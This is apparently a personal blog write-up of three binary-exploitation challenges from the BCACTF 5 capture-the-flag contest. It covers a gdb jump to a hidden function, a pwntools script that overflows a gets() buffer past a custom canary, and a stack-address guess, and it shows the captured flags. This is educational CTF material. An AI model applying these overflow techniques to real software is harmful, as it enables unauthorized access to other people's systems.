---
title: 'bcactf 5 2024'
description: 'Here is the solutions to some of the challenges in bcactf 5'
pubDatetime: 2024-06-23T15:22:00Z
modDatetime: 2023-12-21T09:12:47.400Z
tags: 
- "writeup"
---

# Background Information
I went to this competition as BT Lazy Bums, we did a lot worse than we expected but what could we do? I got lazy so I'm just gonna post the pwn challenges I did.

## Binary Exploitation

### Inaccessable
> I wrote a function to generate the flag, but don't worry, I bet you can't access it!
This felt more like a reverse engineering challenge, but the solve is simple.

Load up gdb and do `info functions`

```bash
0x0000000000400536  c
0x0000000000400599  f
0x00000000004005ea  win
0x00000000004006b8  main
```

So we have a win function. And the hint said to just jump to it. Ok.

```bash
gef➤  jump win
Continuing at 0x4005ee.
bcactf{W0w_Y0u_m4d3_iT_b810c453a9ac9}
[Inferior 1 (process 39665) exited with code 046]
```


### canary keeper
> My friend gave me this executable, but it keeps giving me errors. Can you get the flag?

Based on the title, the solution for this problem is to bypass the "canary", which is basically an alarm that will close a program once it detects a buffer overflow.

Let's look at the code:

(binary ninja)
```c

int32_t main(int32_t argc, char** argv, char** envp)
{
    int64_t var_48;
    __builtin_strncpy(&var_48, "FLAG", 0x40);
    int32_t var_4f;
    __builtin_strncpy(&var_4f, "canary", 7);
    printf("Enter a string: ");
    void buf;
    gets(&buf);
    int32_t rax_3;
    if (check_canary(&var_4f) == 0)
    {
        puts("Buffer overflow detected!");
        rax_3 = 1;
    }
    else if (check_flag(&var_48) == 0)
    {
        printf("Flag: %s\n", "FLAG");
        rax_3 = 0;
    }
    else
    {
        puts("No changes in flag detected!");
        rax_3 = 1;
    }
    return rax_3;
}

```

So as we can see that the input size is 73, and that there is a custom canary coded. What we can do with this is to overflow the binary, but append the canary so that it passes the check.

Here's our tactic: 

1. Input 73 A's and append the binary string "canary" 
2. Add a four character anything. I'll just use flag
3. Get the flag.

Unfortunately I didn't realize that you had to use null bytes in order to allow the canary to bypas the check with data after it. Two days to realize that.

So here's the solve script:

```python
from pwn import *
from pwn import p64
elf = ELF('./provided')


#its 73 space in the input(?)

if args.REMOTE:
    r = remote('challs.bcactf.com', 32101)
else:
    r = process(elf.path)


payload = b'A' * (73)
#does the canary check(?)
payload += b'canary'
payload += b'\x00'
payload += b'flag'

#payload += p64(0x63616e617279)

print(payload)
r.sendline(payload)
print(r.recvall())

```

And we get the flag.

```bash
[*] '/home/jake/bcactf/canary/provided'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.bcactf.com on port 32101: Done
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcanary\x00flag'
[+] Receiving all data: Done (58B)
[*] Closed connection to challs.bcactf.com port 32101
b'Enter a string: Flag: bcactf{s1mple_CANaRY_9b36bd9f3fd2f}\n'
jake@edgygamer:~/bcactf/canary$ 
```

### pwnage
> It's either a bug, a hack, an exploit, or it's pwnage. Let this challenge stand as one of the first of many stairs to mastery over that which can only be described as pwn.

Let's look at the source code provided. 

```c

int main() {
    // Hint: how do these values get stored?
    void* first_var;
    char* guess;
    char flag[100];
    load_flag(flag, 100);

    puts("Welcome to the most tasmastic game of all time!");
    wait_for(3);
    puts("Basically it's just too simple, I've put the");
    puts("flag into the memory and your job is ... to");
    puts("guess where it is!!");
    wait_for(2);
    puts("Have fun!");
    wait_for(1);
    puts("Oh and before you start, I'll give you a little");
    puts("hint, the address of the current stackframe I'm");
    printf("in is %p\n", (&first_var)[-2]);
    wait_for(3);
    puts("Okay anyway, back to the game. Make your guess!");
    puts("(hexadecimals only, so something like 0xA would work)");
    printf("guess> ");

    guess = read_pointer();

    wait_for(3);

    puts("Okay, prepare yourself. If you're right this");
    puts("will print out the flag");
    
    wait_for(1);
    puts("Oh, and if your wrong, this might crash and");
    puts("disconnect you\nGood luck!");

    printf("%s\n", guess);

    return 1;
}
```

Ok, so it prints out the current stack frame of first_var. It then asks for a guess in hexadecimal format, which is a guess for the stack frame of the flag.

We can look at this part specifically:

```c
void* first_var;
char* guess;
char flag[100];
load_flag(flag, 100);
```

So all we need to do is "shift" upwards by adding bytes to the stackframe. Simple. I kind of guessed the offset, but it seems to be 0x20 from the provided stackframe.

```bash
Welcome to the most tasmastic game of all time!
 . . .
Basically it's just too simple, I've put the
flag into the memory and your job is ... to
guess where it is!!
 . .
How fun is that!
 .
Oh and before you start, I'll give you a little
hint, the address of the current stackframe I'm
in is 0x7ffeb79507b0
 . . .
Okay anyway, back to the game. Make your guess!
(hexadecimals only, so something like 0xA would work)
guess> 0x7ffeb79507d0
 . . .
Okay, prepare yourself. If you're right this
will print out the flag
 .
Oh, and if your wrong, this might crash and
disconnect you
Good luck!
bcactf{0nE_two_thR3E_f0ur_567___sT3ps_t0_PwN4G3_70cc0e5edd6ea}
```

